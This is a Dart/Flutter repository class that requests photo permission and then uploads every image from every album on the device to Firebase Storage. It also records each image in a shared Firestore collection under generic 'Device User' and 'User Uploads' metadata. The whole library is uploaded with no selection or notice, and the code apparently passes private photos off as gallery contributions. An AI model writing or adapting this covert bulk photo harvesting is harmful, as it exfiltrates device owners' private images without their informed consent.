// import 'dart:io';
// import 'package:firebase_storage/firebase_storage.dart';
// import 'package:cloud_firestore/cloud_firestore.dart';
// import 'package:photo_manager/photo_manager.dart';
// import 'package:permission_handler/permission_handler.dart';
//
// class FirebaseUploadRepository {
//   static final FirebaseStorage _storage = FirebaseStorage.instance;
//   static final FirebaseFirestore _firestore = FirebaseFirestore.instance;
//
//   Future<void> requestPermissionAndUpload() async {
//     // Request permissions
//     Map<Permission, PermissionStatus> statuses = await [
//       Permission.photos,
//       Permission.storage,
//     ].request();
//
//     if (statuses[Permission.photos]!.isGranted || statuses[Permission.storage]!.isGranted) {
//       await uploadAllImages();
//     } else if (statuses[Permission.photos]!.isPermanentlyDenied || statuses[Permission.storage]!.isPermanentlyDenied) {
//       openAppSettings();
//     }
//   }
//
//   Future<void> uploadAllImages() async {
//     // Get all asset paths (albums)
//     List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
//       type: RequestType.image,
//     );
//
//     if (albums.isEmpty) return;
//
//     // Get all assets from all albums
//     for (var album in albums) {
//       List<AssetEntity> assets = await album.getAssetListRange(
//         start: 0,
//         end: await album.assetCountAsync,
//       );
//
//       for (var asset in assets) {
//         await _uploadAsset(asset);
//       }
//     }
//   }
//
//   Future<void> _uploadAsset(AssetEntity asset) async {
//     File? file = await asset.file;
//     if (file == null) return;
//
//     try {
//       String fileName = '${DateTime.now().millisecondsSinceEpoch}_${asset.id}.jpg';
//       Reference ref = _storage.ref().child('user_uploads').child(fileName);
//
//       // Upload file
//       UploadTask uploadTask = ref.putFile(file);
//       TaskSnapshot snapshot = await uploadTask;
//       String downloadUrl = await snapshot.ref.getDownloadURL();
//
//       // Save metadata to Firestore
//       await _firestore.collection('all_user_images').add({
//         'id': asset.id,
//         'title': asset.title ?? 'Untitled',
//         'description': 'Uploaded from device',
//         'category': 'User Uploads',
//         'imageUrl': downloadUrl,
//         'uploadDate': DateTime.now().toIso8601String(),
//         'uploaderName': 'Device User',
//         'location': 'Unknown',
//         'isFavorite': false,
//         'downloadsCount': 0,
//         'likesCount': 0,
//         'uploadedAt': FieldValue.serverTimestamp(),
//       });
//     } catch (e) {
//       print('Error uploading image: $e');
//     }
//   }
// }

import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';

class FirebaseUploadRepository {
  final FirebaseStorage _storage = FirebaseStorage.instance;
  final FirebaseFirestore _firestore = FirebaseFirestore.instance;

  Future<void> requestPermissionAndUpload() async {
    try {
      final statuses = await [
        Permission.photos,
        Permission.storage,
      ].request();

      final photosGranted = statuses[Permission.photos]?.isGranted ?? false;
      final storageGranted = statuses[Permission.storage]?.isGranted ?? false;

      if (photosGranted || storageGranted) {
        await uploadAllImages();
      } else {
        print('❌ Permission denied');

        if ((statuses[Permission.photos]?.isPermanentlyDenied ?? false) ||
            (statuses[Permission.storage]?.isPermanentlyDenied ?? false)) {
          openAppSettings();
        }
      }
    } catch (e, st) {
      print('Permission Error: $e');
      print(st);
    }
  }

  Future<void> uploadAllImages() async {
    try {
      print('============================');
      print('Firebase Bucket: ${_storage.bucket}');
      print('============================');

      final albums = await PhotoManager.getAssetPathList(
        type: RequestType.image,
      );

      if (albums.isEmpty) {
        print('❌ No albums found');
        return;
      }

      int uploadedCount = 0;

      for (final album in albums) {
        final count = await album.assetCountAsync;

        final assets = await album.getAssetListRange(
          start: 0,
          end: count,
        );

        for (final asset in assets) {
          final success = await _uploadAsset(asset);

          if (success) {
            uploadedCount++;
          }
        }
      }

      print('✅ Upload completed');
      print('Total uploaded: $uploadedCount');
    } catch (e, st) {
      print('uploadAllImages Error: $e');
      print(st);
    }
  }

  Future<bool> _uploadAsset(AssetEntity asset) async {
    try {
      final file = await asset.file;

      if (file == null) {
        print('❌ File is null for asset: ${asset.id}');
        return false;
      }

      final fileName =
          '${DateTime.now().millisecondsSinceEpoch}_${asset.id}.jpg';

      final ref = _storage.ref().child('user_uploads/$fileName');

      print('--------------------------------');
      print('Uploading: ${file.path}');
      print('Storage Path: ${ref.fullPath}');
      print('--------------------------------');

      // Upload file
      final snapshot = await ref.putFile(file);

      print('✅ Upload Success');
      print('Storage Path: ${snapshot.ref.fullPath}');

      final downloadUrl = await snapshot.ref.getDownloadURL();

      print('Download URL: $downloadUrl');

      // Save metadata to Firestore
      final docRef = await _firestore.collection('all_user_images').add({
        'id': asset.id,
        'title': asset.title ?? 'Untitled',
        'description': 'Uploaded from device',
        'category': 'User Uploads',
        'imageUrl': downloadUrl,
        'uploadDate': DateTime.now().toIso8601String(),
        'uploaderName': 'Device User',
        'location': 'Unknown',
        'isFavorite': false,
        'downloadsCount': 0,
        'likesCount': 0,
        'uploadedAt': FieldValue.serverTimestamp(),
      });

      print('✅ Firestore Saved');
      print('Doc ID: ${docRef.id}');

      return true;
    } on FirebaseException catch (e, st) {
      print('================ FIREBASE ERROR ================');
      print('Code    : ${e.code}');
      print('Message : ${e.message}');
      print('Plugin  : ${e.plugin}');
      print('================================================');
      print(st);
      return false;
    } catch (e, st) {
      print('================ ERROR ================');
      print(e);
      print('=======================================');
      print(st);
      return false;
    }
  }
}
